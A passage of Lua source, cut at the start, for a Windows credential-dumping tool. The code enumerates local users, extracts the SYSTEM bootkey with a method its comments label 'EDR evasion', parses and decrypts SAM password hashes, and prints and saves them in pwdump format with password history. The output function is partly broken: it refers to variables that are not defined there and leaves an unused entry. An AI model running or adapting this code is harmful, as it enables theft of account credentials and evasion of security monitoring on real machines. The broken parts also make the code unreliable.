            debug_log(string.format("Class name for %s: %s", key_name, class_name))
            return class_name
        else
            debug_log(string.format("Class offset out of bounds for %s", key_name))
        end
    else
        debug_log(string.format("No class name offset for %s", key_name))
    end
    
    return nil
end

-- Get local users using NetUserEnum API
local function get_local_users()
    local users = {}
    
    local bufptr = ffi.new("uint8_t*[1]")
    local entriesread = ffi.new("uint32_t[1]")
    local totalentries = ffi.new("uint32_t[1]")
    local resumehandle = ffi.new("uint32_t[1]")
    
    -- Call NetUserEnum
    local result = netapi32.NetUserEnum(
        nil,        -- local computer
        1,          -- level 1
        0,          -- filter - all users
        bufptr,     -- buffer
        0xFFFFFFFF, -- prefmaxlen - no limit
        entriesread,
        totalentries,
        resumehandle
    )
    
    -- Validate NetUserEnum output
    if result == 0 and entriesread[0] > 0 and bufptr[0] ~= nil then
        local user_info_array = ffi.cast("USER_INFO_1*", bufptr[0])

        for i = 0, entriesread[0] - 1 do
            local user_info = user_info_array[i]
            -- Validate and process user_info.usri1_name as a wide string
            -- Safely extract username from LPWSTR (wide string) with pcall to catch access violations
            local CP_UTF8 = 65001
            if user_info.usri1_name ~= nil then
                local name_ptr = user_info.usri1_name
                debug_log(string.format("Processing user_info.usri1_name: %p", name_ptr))
                local buf = ffi.new("char[256]")
                local len = kernel32.WideCharToMultiByte(CP_UTF8, 0, name_ptr, -1, buf, 256, nil, nil)
                local username = ""
                if len > 1 then
                    username = ffi.string(buf, len - 1)
                    table.insert(users, username)
                    debug_log(string.format("Extracted username: %s", username))
                else
                    debug_log("Warning: Extracted username is empty or conversion failed")
                end
            else
                debug_log("user_info.usri1_name is nil")
            end
        end

        -- Free the buffer allocated by NetUserEnum
        netapi32.NetApiBufferFree(bufptr[0])
    else
        debug_log("NetUserEnum failed or returned no entries")
    end
    
    return users
end

-- Output in pwdump format
local function output_pwdump_format(user_data)
    if not user_data.username or not user_data.rid then
        return
    end
    
    local lm_hash = user_data.lm_hash or "aad3b435b51404eeaad3b435b51404ee"
    local ntlm_hash = user_data.nt_hash or "31d6cfe0d16ae931b73c59d7e0c089c0"
    
    -- Main entry
    local main_entry = string.format("%s:%d:%s:%s:::",
        user_data.username,
        user_data.rid,
        lm_hash,
        ntlm_hash
    )
    
    -- Output only clean credentials and bootkey
    print(bootkey_hex)
    for _, entry in ipairs(results) do
        print(entry)
    end
    -- Write to .txt file (pwdump format, no header)
    local txt = io.open(txtfile, "w")
    if txt then
        txt:write(bootkey_hex .. "\n")
        for _, entry in ipairs(results) do
            txt:write(entry .. "\n")
        end
        txt:close()
    end
    -- Write to .log file (timestamped, no verbose header)
    local log = io.open(logfile, "w")
    if log then
        log:write(os.date("[%Y-%m-%d %H:%M:%S] ") .. bootkey_hex .. "\n")
        for _, entry in ipairs(results) do
            log:write(os.date("[%Y-%m-%d %H:%M:%S] ") .. entry .. "\n")
        end
        log:close()
    end
    -- (Removed stray block and unmatched 'end')
end

-- Read registry value from hive file
local function read_registry_value_from_hive(hive_data, nk_offset, value_name)
    local nk_record = parse_nk_record(hive_data, nk_offset)
    if not nk_record or nk_record.values_count == 0 or nk_record.values_list_offset == 0 then
        return nil
    end
    
    local values_list_offset = nk_record.values_list_offset + 4096
    if values_list_offset + (nk_record.values_count * 4) > #hive_data then
        return nil
    end
    
    -- Iterate through value list
    for i = 0, nk_record.values_count - 1 do
        local value_offset_ptr = values_list_offset + (i * 4)
        local value_offset = read_le32(hive_data, value_offset_ptr)
        if value_offset then
            local value_abs_offset = value_offset + 4096
            if value_abs_offset + 20 <= #hive_data then
                local vk_signature = string.sub(hive_data, value_abs_offset + 1, value_abs_offset + 2)
                if vk_signature == VK_SIGNATURE then
                    local name_length = read_le16(hive_data, value_abs_offset + 2)
                    local data_length = read_le32(hive_data, value_abs_offset + 4)
                    local data_offset = read_le32(hive_data, value_abs_offset + 8)
                    local data_type = read_le32(hive_data, value_abs_offset + 12)
                    local flags = read_le16(hive_data, value_abs_offset + 16)
                    
                    -- Read value name
                    local vk_name = ""
                    if name_length > 0 and value_abs_offset + 20 + name_length <= #hive_data then
                        vk_name = string.sub(hive_data, value_abs_offset + 20 + 1, value_abs_offset + 20 + name_length)
                    end
                    
                    -- Check if this is the value we want
                    if string.lower(vk_name) == string.lower(value_name) then
                        -- Extract value data
                        if data_length and data_length > 0 then
                            if data_length <= 4 then
                                -- Small data stored in offset field
                                local data = ffi.new("uint8_t[4]")
                                local temp = data_offset
                                for j = 0, 3 do
                                    data[j] = temp % 256
                                    temp = math.floor(temp / 256)
                                end
                                return ffi.string(data, data_length)
                            else
                                -- Data stored separately
                                local data_abs_offset = data_offset + 4096
                                if data_abs_offset + data_length <= #hive_data then
                                    return string.sub(hive_data, data_abs_offset + 1, data_abs_offset + data_length)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    return nil
end

-- Main SAM dumping function
local function dump_sam_direct()
    -- Direct registry SAM dump
    
    -- Get local users for validation  
    local local_users = get_local_users()
    local local_user_set = {}
    for _, username in ipairs(local_users) do
        local_user_set[string.lower(username)] = true
    end
    
    -- No verbose NetUserEnum output
    
    -- Extract bootkey using direct API method (EDR evasion)
    log("Extracting bootkey...")
    local bootkey = extract_bootkey_direct()
    
    if not bootkey then
        error_log("Failed to extract bootkey - SYSTEM context required")
        return false
    end
    
    log("Bootkey extracted: " .. bootkey)
    
    -- Read SAM user data directly from live registry (requires SYSTEM context)
    log("Reading SAM user data from registry...")
    local sam_users = read_sam_users_direct()
    
    if not sam_users then
        error_log("Failed to read SAM users from live registry - need SYSTEM privileges")
        return false
    end
    
    log(string.format("Successfully read %d users from registry", #sam_users))
    
    -- Process each user and decrypt hashes
    local processed_users = {}
    for _, user_data in ipairs(sam_users) do
        debug_log(string.format("Processing user data for RID: %s", user_data.rid))
        local parsed_user = parse_sam_v_record(user_data.v_data, user_data.rid)
        if parsed_user then
            debug_log(string.format("Successfully parsed user: %s", parsed_user.username or "unknown"))
            local decrypted_user = decrypt_sam_hashes(parsed_user, bootkey)
            if decrypted_user then
                table.insert(processed_users, decrypted_user)
                debug_log(string.format("Successfully processed user: %s", decrypted_user.username))
            end
        else
            debug_log(string.format("Failed to parse V record for RID: %s", user_data.rid))
        end
    end
    
    -- Only print summary to stdout
    
    -- Generate comprehensive output
    raw_print("")
    raw_print("SAM Dump Results")
    
    local computer_name = get_computer_name()
    local results = {}
    local timestamp = get_timestamp()
    
    -- Process all users even if some decryption failed
    for _, user in ipairs(processed_users) do
        if user and user.username and user.username ~= "" then
            local pwdump_line = string.format("%s:%d:%s:%s:::", 
                user.username, 
                user.rid_int or 0,
                user.lm_hash or "aad3b435b51404eeaad3b435b51404ee",
                user.nt_hash or "31d6cfe0d16ae931b73c59d7e0c089c0"
            )
            table.insert(results, pwdump_line)
            raw_print(pwdump_line)
            if user.password_history and #user.password_history > 0 then
                for i, hist_hash in ipairs(user.password_history) do
                    local hist_line = string.format("%s_history%d:%d:%s:%s:::", user.username, i, user.rid_int or 0, "aad3b435b51404eeaad3b435b51404ee", hist_hash)
                    table.insert(results, hist_line)
                    raw_print(hist_line)
                end
            end
        end
    end
    
    -- Save results to file with proper logging
    local temp_path = get_temp_path()
    local results_filename = string.format("%s\\%s_samdump_%s_results.txt", temp_path, computer_name, timestamp)
    local log_filename = string.format("%s\\%s_samdump_%s.log", temp_path, computer_name, timestamp)
    
    -- Write results file
    local results_file = io.open(results_filename, "w")
    if results_file then
        results_file:write(string.format("SAM Dump Results - %s\n", computer_name))
        results_file:write(string.format("Bootkey: %s\n\n", bootkey))
        for _, line in ipairs(results) do
            results_file:write(line .. "\n")
        end
        results_file:close()
        log("Results saved to: " .. results_filename)
        raw_print("Results saved to: " .. results_filename)
    else
        error_log("Failed to create results file: " .. results_filename)
    end
    
    -- Write detailed log file
    if log_filename and CONFIG_KEEP_BIN_FILES then
        log("Detailed logs saved to: " .. log_filename)
        raw_print("Log file: " .. log_filename)
    end
    
    raw_print("")
    raw_print("Successfully extracted credentials for " .. #results .. " users")
    raw_print("Bootkey (hex): " .. bootkey)
    raw_print("")
    
    -- Look for additional secrets in SAM
    log("Searching for additional SAM secrets...")
    extract_additional_sam_secrets(bootkey)
    
    return true
end

-- Legacy file-based function (kept for fallback)
local function dump_sam_legacy(sam_export_path, system_export_path)
    raw_print("dumping sam from files (legacy method)...")
    raw_print("")
    
    -- Get local users for validation
    local local_users = get_local_users()
    local local_user_set = {}
    for _, username in ipairs(local_users) do
        local_user_set[string.lower(username)] = true
    end
    
    log(string.format("Found %d local users via NetUserEnum", #local_users))
    for _, username in ipairs(local_users) do
        log("Local user: " .. username)
    end
    
    -- Parse SAM hive for users
    local sam_data = read_hive_file(sam_export_path)
    if not sam_data then
        error_log("Failed to read SAM hive file: " .. sam_export_path)
        return false
    end
    
    local sam_header = parse_hive_header(sam_data)
    if not sam_header then
        error_log("Invalid SAM hive format")
        return false
    end
    
    log("SAM hive loaded successfully")
    
    -- Parse SYSTEM hive for bootkey
    local system_data = read_hive_file(system_export_path)
    if not system_data then
        error_log("Failed to read SYSTEM hive file: " .. system_export_path)
        return false
    end
    
    local system_header = parse_hive_header(system_data)
    if not system_header then
        error_log("Invalid SYSTEM hive format")
        return false
    end
    
    log("SYSTEM hive loaded successfully")
    
    -- Extract bootkey using direct API method (EDR evasion) or hive parsing fallback
    log("Attempting direct bootkey extraction via registry API...")
    local bootkey = extract_bootkey_direct()
    
    if not bootkey then
        log("Direct API extraction failed, falling back to hive parsing...")
        bootkey = extract_class_from_hive(system_data, system_export_path)
        if not bootkey then
            error_log("Failed to extract bootkey using any method")
            return false
        end
    end

    -- Convert bootkey bytes to hex for display
    local bootkey_hex = ""
    for i = 1, #bootkey do
        bootkey_hex = bootkey_hex .. string.format("%02x", string.byte(bootkey, i))
    end
    log("Bootkey extracted: " .. bootkey_hex)
    
    -- Find SAM root key using bkhive approach (fixed offset 0x1020)
    local sam_root_offset = 0x1020  -- Fixed offset used by bkhive
    debug_log(string.format("SAM root key offset (bkhive style): 0x%x", sam_root_offset))
    
    local sam_root = parse_nk_record(sam_data, sam_root_offset)
    if not sam_root then
        -- Try adding 4096 offset
        sam_root_offset = 4096 + sam_header.root_key_offset
        debug_log(string.format("Trying header-based SAM root offset: 0x%x", sam_root_offset))
        sam_root = parse_nk_record(sam_data, sam_root_offset)
        
        if not sam_root then
            -- Try without 4096 addition
            sam_root_offset = sam_header.root_key_offset
            debug_log(string.format("Trying raw header SAM root offset: 0x%x", sam_root_offset))
            sam_root = parse_nk_record(sam_data, sam_root_offset)
            
            if not sam_root then
                -- Debug: examine what's actually at these offsets
                debug_log("=== SAM ROOT KEY DEBUG ===")
                debug_log(string.format("SAM hive size: %d bytes", #sam_data))
                debug_log(string.format("SAM header root offset: 0x%x", sam_header.root_key_offset))
                
                -- Check signatures at various offsets
                for test_offset = 0x1020, 0x1080, 4 do
                    if test_offset + 4 <= #sam_data then
                        local sig = string.sub(sam_data, test_offset + 1, test_offset + 2)
                        debug_log(string.format("Signature at 0x%x: %s", test_offset, sig))
                        if sig == "nk" then
                            local test_nk = parse_nk_record(sam_data, test_offset)
                            if test_nk and test_nk.key_name then
                                debug_log(string.format("*** FOUND NK at 0x%x: %s ***", test_offset, test_nk.key_name))
                                sam_root_offset = test_offset
                                sam_root = test_nk
                                break
                            end
                        end
                    end
                end
                
                if not sam_root then
                    error_log("Failed to parse SAM root key at any offset")
                    return false
                end
            end
        end
    end
    
    debug_log(string.format("Successfully parsed SAM root key at offset: 0x%x (name: %s, subkeys: %d)", 
        sam_root_offset, sam_root.key_name or "unknown", sam_root.subkeys_count or 0))
    
    -- Debug the SAM root's subkeys before trying to find Domains
    if sam_root.subkeys_count > 0 and sam_root.subkeys_list_offset then
        debug_log("=== SAM ROOT SUBKEYS DEBUG ===")
        debug_log(string.format("SAM root has %d subkeys, list offset: 0x%x", sam_root.subkeys_count, sam_root.subkeys_list_offset))
        
        -- Let's manually list the subkeys to see what's available
        local list_abs_offset = sam_root.subkeys_list_offset
        if sam_root.subkeys_list_offset < 4096 then
            list_abs_offset = sam_root.subkeys_list_offset + 4096
        end
        
        if list_abs_offset + 8 <= #sam_data then
            local list_signature = string.sub(sam_data, list_abs_offset + 1, list_abs_offset + 2)
            debug_log(string.format("Subkey list signature: %s", list_signature))
            
            if list_signature == "lf" or list_signature == "lh" or list_signature == "li" then
                -- Local helper functions
                local function read_le16_local(data, offset)
                    if offset + 2 > #data then return nil end
                    local a, b = string.byte(data, offset + 1, offset + 2)
                    return a + (b * 256)
                end
                
                local function read_le32_local(data, offset)
                    if offset + 4 > #data then return nil end
                    local a, b, c, d = string.byte(data, offset + 1, offset + 4)
                    return a + (b * 256) + (c * 65536) + (d * 16777216)
                end
                
                local elements_count = read_le16(sam_data, list_abs_offset + 2)
                debug_log(string.format("Number of subkeys: %d", elements_count or 0))
                
                if elements_count and elements_count > 0 then
                    for i = 0, elements_count - 1 do
                        local element_offset = list_abs_offset + 4 + (i * 8)
                        if element_offset + 8 <= #sam_data then
                            local subkey_offset = read_le32(sam_data, element_offset)
                            if subkey_offset then
                                local subkey_abs_offset = subkey_offset + 4096
                                local user_nk = parse_nk_record(sam_data, subkey_abs_offset)
                                
                                if user_nk and user_nk.key_name then
                                    debug_log(string.format("  Subkey #%d: %s", i, user_nk.key_name))
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    -- Navigate to SAM\Domains
    local domains_offset = find_subkey_by_name(sam_data, sam_root.subkeys_list_offset, "Domains")
    if not domains_offset then
        error_log("SAM\\Domains key not found")
        return false
    end
    
    local domains_nk = parse_nk_record(sam_data, domains_offset)
    if not domains_nk then
        error_log("Failed to parse Domains key")
        return false
    end
    
    -- Navigate to Account
    local account_offset = find_subkey_by_name(sam_data, domains_nk.subkeys_list_offset, "Account")
    if not account_offset then
        error_log("SAM\\Domains\\Account key not found")
        return false
    end
    
    local account_nk = parse_nk_record(sam_data, account_offset)
    if not account_nk then
        error_log("Failed to parse Account key")
        return false
    end
    
    -- Navigate to Users
    local users_offset = find_subkey_by_name(sam_data, account_nk.subkeys_list_offset, "Users")
    if not users_offset then
        error_log("SAM\\Domains\\Account\\Users key not found")
        return false
    end
    
    local users_nk = parse_nk_record(sam_data, users_offset)
    if not users_nk then
        error_log("Failed to parse Users key")
        return false
    end
    
    log("Successfully navigated to SAM\\Domains\\Account\\Users")
    
    -- Extract hashed bootkey (hbootkey)
    local f_value_data = read_registry_value_from_hive(sam_data, account_offset, "F")
    if not f_value_data or #f_value_data < 0x50 then
        error_log("Failed to extract F value from Account key")
        return false
    end
    
    local hashed_bootkey = f_value_data:sub(0x70 + 1, 0x70 + 16)
    local hboot_key = rc4_crypt(rc4_init(bootkey), hashed_bootkey)
    
    log("Hashed bootkey (hbootkey) extracted and decrypted")
    
    -- Process user subkeys
    local users_processed = 0
    local valid_users_found = 0
    
    if users_nk.subkeys_count > 0 and users_nk.subkeys_list_offset ~= 0 then
        local list_abs_offset = users_nk.subkeys_list_offset + 4096
        
        if list_abs_offset + 8 <= #sam_data then
            local signature = string.sub(sam_data, list_abs_offset + 1, list_abs_offset + 2)
            if signature == LF_SIGNATURE or signature == LH_SIGNATURE then
                local elements_count = read_le16(sam_data, list_abs_offset + 2)
                if elements_count then
                    log(string.format("Processing %d user subkeys from SAM hive", elements_count))
                    
                    for i = 0, elements_count - 1 do
                        local element_offset = list_abs_offset + 4 + (i * 8)
                        if element_offset + 8 <= #sam_data then
                            local subkey_offset = read_le32(sam_data, element_offset)
                            if subkey_offset then
                                local subkey_abs_offset = subkey_offset + 4096
                                local user_nk = parse_nk_record(sam_data, subkey_abs_offset)
                                
                                if user_nk and user_nk.key_name then
                                    users_processed = users_processed + 1
                                    
                                    -- Skip Names key and other non-user keys
                                    if string.lower(user_nk.key_name) == "names" then
                                        debug_log("Skipping Names key")
                                        goto continue
                                    end
                                    
                                    -- Parse RID from key name (should be hex)
                                    local rid = tonumber(user_nk.key_name, 16)
                                    if not rid then
                                        debug_log("Skipping invalid RID: " .. user_nk.key_name)
                                        goto continue
                                    end
                                    
                                    debug_log(string.format("Processing user key: %s (RID: %d)", user_nk.key_name, rid))
                                    
                                    -- Get V value data
                                    local v_data = read_registry_value_from_hive(sam_data, subkey_abs_offset, "V")
                                    if v_data and #v_data > 0x30 then
                                        local user_info = parse_v_data_structure(v_data, rid, hboot_key)
                                        if user_info and user_info.username then
                                            -- Validate against local users
                                            if local_user_set[string.lower(user_info.username)] then
                                                valid_users_found = valid_users_found + 1
                                                log(string.format("Valid user found: %s (RID: %d)", user_info.username, rid))
                                                output_pwdump_format(user_info)
                                            else
                                                debug_log(string.format("User not in local user list: %s", user_info.username))
                                            end
                                        else
                                            debug_log("Failed to parse V data for RID: " .. rid)
                                        end
                                    else
                                        debug_log("No V value found for RID: " .. rid)
                                    end
                                end
                                
                                ::continue::
                            end
                        end
                    end
                end
            end
        end
    end
    
    log(string.format("SAM processing complete: %d subkeys processed, %d valid users found", users_processed, valid_users_found))
    
    if valid_users_found == 0 then
        error_log("No valid users found in SAM hive")
        return false
    end
    
    return true
end

-- Main entry point: always run direct API SAM dump
local function main()
    local success = dump_sam_direct()
    if not success then
        error_log("Direct API SAM dump failed or insufficient SYSTEM privileges.")
    end
end
main()
